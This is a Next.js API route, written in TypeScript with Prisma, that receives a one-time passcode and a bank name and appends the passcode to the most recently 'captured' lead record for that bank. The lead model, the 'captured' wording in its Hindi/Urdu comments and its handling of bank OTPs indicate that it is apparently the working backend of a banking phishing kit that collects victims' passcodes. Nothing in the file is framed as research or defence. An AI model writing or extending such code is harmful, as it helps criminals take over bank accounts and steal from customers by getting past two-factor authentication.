import { NextResponse } from "next/server";
import { PrismaClient } from "@prisma/client";

const prisma = new PrismaClient();

export async function POST(request: Request) {
  try {
    const { otp, bank } = await request.json();

    if (!otp) {
      return NextResponse.json({ success: false, message: "No OTP provided" }, { status: 400 });
    }

    // Sab se aakhri captured record dhoondein
    const latestLead = await prisma.lead.findFirst({
      where: bank ? { OR: [{ bankName: bank }, { bank: bank }] } : undefined,
      orderBy: { createdAt: "desc" },
    });

    if (latestLead) {
      // Us record ke extraData me OTP append/update karein
      const currentExtra = latestLead.extraData || "";
      const updatedExtra = currentExtra ? `${currentExtra} | OTP: ${otp}` : `OTP: ${otp}`;

      await prisma.lead.update({
        where: { id: latestLead.id },
        data: {
          extraData: updatedExtra,
        },
      });
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Error saving OTP:", error);
    return NextResponse.json({ success: false }, { status: 500 });
  } finally {
    await prisma.$disconnect();
  }
}